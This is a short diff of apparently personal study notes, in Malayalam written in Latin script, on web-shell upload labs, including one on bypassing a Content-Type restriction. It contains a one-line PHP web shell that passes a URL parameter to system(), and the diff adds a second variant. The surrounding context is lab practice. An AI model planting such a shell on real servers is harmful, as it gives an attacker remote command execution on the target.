@@ -16,6 +16,7 @@
 -->NOTE: ivide php file execute chyunond aan ee rethiyil exploit chyan kazhinjath
 -->nerthe php code aakunilegi ith try chyth noku:
                        <?php echo system($_GET['command']); ?>
+                       <?php echo system($_GET['ls']); ?>
 
 
        Lab-2( Web shell upload via Content-Type restriction bypass)
@@ -97,4 +98,4 @@ turbo intruder python code:
     def handleResponse(req, interesting):
     table.add(req)
 	
-==============================================================
+==========================================================
